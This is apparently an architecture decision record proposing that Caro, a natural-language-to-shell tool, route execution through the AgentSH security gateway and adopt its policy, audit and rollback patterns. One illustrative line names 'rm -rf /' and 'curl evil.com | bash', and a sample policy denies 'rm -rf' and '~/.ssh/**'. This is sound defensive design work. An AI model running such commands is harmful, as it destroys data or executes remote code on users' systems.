# ADR-015: AgentSH Integration — Execution-Layer Security for Caro

**Status**: Proposed

**Date**: 2026-02-27

**Authors**: @wildcard

**Target**: Hybrid (Community core + Enterprise advanced features)

## Context

Caro generates shell commands from natural language and executes them in the user's shell. Our safety validation relies on 52+ regex patterns (`src/safety/patterns.rs`) that catch known dangerous commands before execution. While effective, this approach has fundamental blind spots:

1. **Pattern evasion**: Obfuscation, hex encoding, variable expansion bypass regex matching
2. **Subprocess opacity**: Once a command runs, caro cannot see what child processes it spawns
3. **No runtime governance**: We validate the *command string*, but not the *runtime behavior*
4. **No audit trail**: After execution, there's no structured record of what actually happened

[AgentSH](https://github.com/canyonroad/agentsh) is an execution-layer security gateway that addresses exactly these gaps. It intercepts and governs file, network, process, and signal activity at the syscall level using FUSE/eBPF (Linux), ESF (macOS), and minifilter drivers (Windows). It operates as a policy-enforced shell with five decision types: `allow`, `deny`, `approve`, `redirect`, and `soft_delete`.

### Why This Matters Now

- ADR-010 proposed bubblewrap sandbox for execution isolation — agentsh is a more complete solution that subsumes sandboxing with runtime policy enforcement
- As caro moves toward agentic workflows (multi-step command chains), runtime governance becomes critical
- Enterprise users need audit trails and compliance-grade execution controls
- The AI agent security space is maturing — agentsh represents the emerging "execution-layer security" pattern

### Stakeholders

- **End users**: Get defense-in-depth without configuring sandboxes manually
- **Enterprise/security teams**: Get audit trails, policy enforcement, and compliance tooling
- **Caro maintainers**: Benefit from lessons in runtime security architecture
- **AI agent ecosystem**: Integration demonstrates the "NL→command + execution security" stack

## Decision

We will integrate agentsh as an **optional execution backend** for caro, and separately adopt several architectural patterns from agentsh into caro's core.

### Two-Track Approach

**Track 1: Direct Integration** — Route command execution through agentsh when available
**Track 2: Architectural Lessons** — Adopt patterns into caro's own codebase regardless of agentsh availability

## What We Can Learn from AgentSH

### 1. Five-Decision Policy Model (vs Binary Allow/Block)

**AgentSH**: `allow | deny | approve | redirect | soft_delete`
**Caro today**: `allowed: bool` (binary)

Caro's `ValidationResult.allowed` is a boolean. AgentSH's richer decision model is strictly better:

| Decision | Meaning | Caro Equivalent Today | What We Should Add |
|----------|---------|----------------------|-------------------|
| `allow` | Permit | `allowed: true` | Already exists |
| `deny` | Block | `allowed: false` | Already exists |
| `approve` | Human confirms | Partially (confirmation prompt) | Formalize as decision type |
| `redirect` | Swap command | None | **New**: suggest safer alternatives |
| `soft_delete` | Quarantine | None | **New**: sandbox + undo for destructive ops |

**Action**: Evolve `ValidationResult` from `allowed: bool` to a `Decision` enum.

### 2. Redirect ("Steering") Pattern

AgentSH's most innovative feature: instead of blocking `curl`, redirect it to `agentsh-fetch` (an audited wrapper). The agent sees success but the system controls the actual behavior.

**Application to caro**: When safety validation detects a risky-but-legitimate intent (e.g., `rm -rf node_modules`), instead of blocking, suggest a **safer equivalent** (`find node_modules -delete` with confirmation, or `trash node_modules`).

This aligns with caro's existing `alternatives` field in `GeneratedCommand` but makes it actionable rather than informational.

### 3. Subprocess Tree Visibility

AgentSH's key insight: "Traditional 'ask for approval before running a command' controls stop at the tool boundary and can't see what happens inside that command."

**Caro's gap**: We validate `make deploy` but can't see that `make deploy` internally runs `rm -rf /`, `curl evil.com | bash`, etc.

**Action**: For commands that spawn subprocesses (make, npm scripts, shell scripts), add a `--trace` mode that uses `strace`/`dtrace` to monitor syscalls and flag dangerous runtime behavior.

### 4. Structured Audit Events

AgentSH emits JSON-structured events for every operation: decision, actor, path, outcome, timing.

**Caro today**: Unstructured stdout/stderr capture in `ExecutionResult`.

**Action**: Add structured telemetry to `ExecutionResult`:
```rust
pub struct ExecutionAudit {
    pub command: String,
    pub decision: Decision,
    pub files_accessed: Vec<FileAccess>,
    pub network_connections: Vec<NetworkEvent>,
    pub subprocesses: Vec<ProcessEvent>,
    pub timestamp: DateTime<Utc>,
    pub session_id: String,
}
```

### 5. Workspace Checkpoints

AgentSH auto-snapshots before destructive operations (`rm`, `git reset`), enabling preview and rollback.

**Application to caro**: Before executing any command with `RiskLevel::High` or above, auto-create a workspace checkpoint (git stash, directory snapshot, or `cp -r`). If the command goes wrong, offer one-command rollback.

### 6. Policy-as-Code with Profiles

AgentSH ships starter policy packs: `dev-safe.yaml`, `ci-strict.yaml`, `agent-sandbox.yaml`.

**Caro's equivalent**: Our `SafetyLevel` enum (`Strict/Moderate/Permissive`) is limited. We should support user-defined policy files:

```toml
# ~/.config/caro/policies/work.toml
[policy]
name = "work-project"
extends = "moderate"

[rules.allow]
commands = ["docker", "npm", "cargo"]
paths = ["~/work/**"]

[rules.deny]
commands = ["rm -rf"]
paths = ["/etc/**", "~/.ssh/**"]

[rules.redirect]
"curl" = "curl --max-time 30"  # Add timeout to all curls
```

### 7. Session Model for Agentic Workflows

AgentSH creates long-lived sessions that track subprocess trees across multiple command invocations. This is essential for agentic loops where one command informs the next.

**Caro's agent loop** (`src/agent/mod.rs`) already iterates through generate→validate→refine cycles, but each execution is isolated. Adding session context would enable:
- Cumulative risk scoring across a chain of commands
- Rollback to any checkpoint in the session
- Audit trail of the entire agentic workflow

### 8. Environment Variable Security

AgentSH constructs a minimal environment (PATH, LANG, TERM, HOME) with built-in secret filtering and configurable allow/deny lists.

**Caro today**: Inherits the full parent environment for command execution.

**Action**: Strip sensitive env vars (AWS keys, API tokens, etc.) before command execution unless explicitly needed.

## Architecture

### Integration Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                         Caro Pipeline                                │
│  NL Input → Static Match → LLM Generate → Safety Validate           │
└──────────────────────────────┬──────────────────────────────────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   Decision Router     │
                    │  (5-way decision)     │
                    └──────┬───────────────┘
                           │
              ┌────────────┼────────────────────┐
              ▼            ▼                     ▼
        ┌──────────┐ ┌──────────────┐  ┌────────────────┐
        │  Direct   │ │  AgentSH     │  │  Bubblewrap    │
        │ Executor  │ │  Executor    │  │  Sandbox       │
        │ (current) │ │  (new)       │  │  (ADR-010)     │
        └──────────┘ └──────────────┘  └────────────────┘
              │            │                     │
              │      ┌─────┴──────┐              │
              │      │ agentsh    │              │
              │      │  session   │              │
              │      │  + policy  │              │
              │      │  + audit   │              │
              │      └────────────┘              │
              └────────────┬────────────────────┘
                           ▼
                    ┌──────────────────────┐
                    │  ExecutionResult +    │
                    │  AuditTrail          │
                    └──────────────────────┘
```

### Module Structure

```
src/execution/
├── mod.rs              # ExecutionResult, ExecutorBackend trait
├── executor.rs         # Direct executor (existing)
├── decision.rs         # NEW: 5-way Decision enum
├── audit.rs            # NEW: Structured audit events
├── checkpoint.rs       # NEW: Workspace checkpoint/rollback
├── sandbox/            # ADR-010 bubblewrap (existing plan)
│   ├── mod.rs
│   ├── bubblewrap.rs
│   └── profiles.rs
└── agentsh/            # NEW: AgentSH integration
    ├── mod.rs          # AgentShExecutor
    ├── session.rs      # Session lifecycle management
    ├── policy.rs       # Policy mapping (caro safety → agentsh policy)
    └── events.rs       # Audit event parsing
```

### Key Interface Changes

```rust
/// Evolved from binary allowed/blocked to 5-way decision
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Decision {
    /// Command is safe, execute directly
    Allow,
    /// Command is blocked, do not execute
    Deny { reason: String },
    /// Requires human confirmation before execution
    Approve { prompt: String, timeout: Duration },
    /// Replace with safer equivalent
    Redirect { original: String, replacement: String, reason: String },
    /// Execute but quarantine effects for rollback
    SoftExecute { checkpoint_id: String },
}

/// Extended execution result with audit trail
pub struct ExecutionResult {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub execution_time_ms: u64,
    pub success: bool,
    // NEW fields
    pub decision: Decision,
    pub audit: Option<ExecutionAudit>,
    pub checkpoint_id: Option<String>,
}
```

## Implementation Plan

### Phase 1: Architectural Adoption (No agentsh dependency)

**Goal**: Adopt agentsh patterns into caro core

1. **Decision enum**: Replace `ValidationResult.allowed: bool` with `Decision` enum
2. **Redirect support**: When blocking a command, suggest safer alternatives that auto-execute
3. **Environment scrubbing**: Strip sensitive env vars before execution
4. **Structured audit**: Add `ExecutionAudit` to execution results
5. **Policy files**: Support user-defined TOML policy files extending safety levels

**Estimated effort**: 2-3 weeks

### Phase 2: AgentSH as Optional Backend

**Goal**: Route execution through agentsh when installed

1. **Detection**: Check for `agentsh` binary in PATH at startup
2. **Session management**: Create agentsh session per caro invocation (or per agent loop)
3. **Policy mapping**: Translate `SafetyLevel` → agentsh policy YAML
4. **Execution routing**: `agentsh exec $SID -- <command>` instead of direct shell
5. **Event parsing**: Parse agentsh JSON output for audit enrichment
6. **Fallback**: Graceful degradation to direct execution when agentsh unavailable

**Estimated effort**: 2-3 weeks

### Phase 3: Deep Integration

**Goal**: Leverage agentsh's advanced features

1. **Subprocess monitoring**: Use agentsh's syscall-level visibility for runtime validation
2. **Workspace checkpoints**: Auto-checkpoint before high-risk executions
3. **LLM proxy**: Route embedded backend API calls through agentsh DLP
4. **MCP security**: If caro adds MCP tool support, use agentsh's MCP enforcement
5. **Session reports**: Generate markdown audit reports for agentic workflows

**Estimated effort**: 4-6 weeks

### Phase 4: Enterprise Features

**Goal**: Enterprise-grade execution governance

1. **OIDC authentication**: Enterprise SSO for execution approval
2. **WebAuthn approval**: Hardware key confirmation for critical commands
3. **CI/CD policies**: `ci-strict` profile for automated pipelines
4. **Centralized audit**: Forward execution events to enterprise logging systems
5. **Policy generation**: Profile-then-lock workflow for deployment hardening

**Estimated effort**: 4-8 weeks (enterprise track)

## Consequences

### Benefits

1. **Defense in depth**: Runtime governance complements static pattern matching
2. **Subprocess visibility**: See what commands actually do, not just what they say
3. **Richer decisions**: `redirect` and `soft_delete` are strictly better than binary allow/block
4. **Audit compliance**: Structured event logs meet enterprise security requirements
5. **Ecosystem positioning**: "NL→command + execution security" is a compelling stack
6. **Reduced maintenance**: Agentsh handles low-level syscall interception we'd otherwise build ourselves

### Trade-offs

1. **Optional dependency**: Agentsh is Go-based, not a Rust crate — it's an external binary
2. **Platform coverage gap**: Full enforcement only on Linux initially (70-90% macOS, 85% Windows)
3. **Added latency**: Session creation + policy evaluation adds ~50-200ms per execution
4. **Complexity**: Two security layers (caro patterns + agentsh policies) need clear ownership boundaries
5. **Young project**: Agentsh is relatively new — API stability not guaranteed

### Risks

| Risk | Impact | Mitigation |
|------|--------|------------|
| AgentSH project abandoned | Lost integration investment | Phase 1 patterns are self-contained; agentsh is optional |
| API breaking changes | Integration breaks | Pin agentsh version, maintain compatibility layer |
| Performance regression | Poor UX | Benchmark in CI, fast path for low-risk commands |
| User confusion (two safety systems) | Support burden | Clear docs: caro patterns = fast pre-check, agentsh = runtime enforcement |
| License incompatibility | Distribution issues | Verify agentsh license compatibility with AGPL-3.0 |

## Alternatives Considered

### Alternative 1: Build Runtime Enforcement In-House

- **Description**: Implement syscall monitoring using `seccomp` (Linux) / `sandbox-exec` (macOS) directly in Rust
- **Pros**: No external dependency, full control, Rust-native
- **Cons**: Massive effort (person-months), reinventing agentsh's wheel, platform-specific expertise needed
- **Verdict**: Not justified when agentsh exists and is well-designed

### Alternative 2: Bubblewrap Only (ADR-010)

- **Description**: Continue with bubblewrap sandbox as planned
- **Pros**: Simpler, focused on isolation
- **Cons**: No runtime visibility, no policy engine, no redirect/soft-delete, no audit trail
- **Verdict**: Bubblewrap is a subset of what agentsh provides; can coexist as fallback

### Alternative 3: Docker-based Execution

- **Description**: Run all commands in ephemeral containers
- **Pros**: Strong isolation, familiar model
- **Cons**: Heavyweight, requires daemon, poor UX for CLI tool, significant latency
- **Verdict**: Overkill for single-command execution

### Alternative 4: Adopt Only Patterns, Skip Integration

- **Description**: Learn from agentsh's design but never integrate the actual tool
- **Pros**: No dependency, simpler architecture
- **Cons**: Miss runtime enforcement benefits, limited to pattern-matching pre-checks
- **Verdict**: Phase 1 does this; Phase 2+ adds the integration for users who want it

## Relationship to ADR-010 (Bubblewrap Sandbox)

ADR-010 and ADR-015 are **complementary, not conflicting**:

| Aspect | ADR-010 (Bubblewrap) | ADR-015 (AgentSH) |
|--------|---------------------|-------------------|
| **Scope** | Filesystem/network isolation | Full runtime governance |
| **Mechanism** | User namespaces | FUSE/eBPF/syscall interception |
| **Decisions** | Allow or block | 5-way (allow/deny/approve/redirect/soft_delete) |
| **Visibility** | None (black box isolation) | Full syscall-level audit |
| **Dependency** | `bwrap` binary | `agentsh` binary |
| **Coexistence** | Fallback when agentsh unavailable | Primary when available |

**Recommendation**: Implement bubblewrap as the lightweight fallback, agentsh as the full-featured option. Phase 1 patterns benefit both.

## Success Metrics

| Metric | Target | Measurement |
|--------|--------|-------------|
| Phase 1 decision model coverage | 100% of ValidationResult callers migrated | Code audit |
| Redirect suggestions | >30% of blocked commands offer alternatives | Test suite |
| Agentsh detection rate | >90% accuracy on supported platforms | Integration tests |
| Execution overhead with agentsh | <200ms p95 | Benchmark suite |
| Audit event completeness | 100% of executions produce audit records | Integration tests |
| Enterprise interest | >3 enterprise inquiries within 3 months | Inbound tracking |

## References

- [AgentSH GitHub](https://github.com/canyonroad/agentsh) — Execution-layer security for AI agents
- [ADR-010](./ADR-010-bubblewrap-sandbox-execution.md) — Bubblewrap sandbox (complementary)
- [ADR-001](./ADR-001-enterprise-community-architecture.md) — Enterprise/community architecture
- Caro safety module: `src/safety/mod.rs`, `src/safety/patterns.rs`
- Caro execution module: `src/execution/executor.rs`
- Caro agent loop: `src/agent/mod.rs`

## Revision History

| Date | Author | Changes |
|------|--------|---------|
| 2026-02-27 | @wildcard | Initial draft |
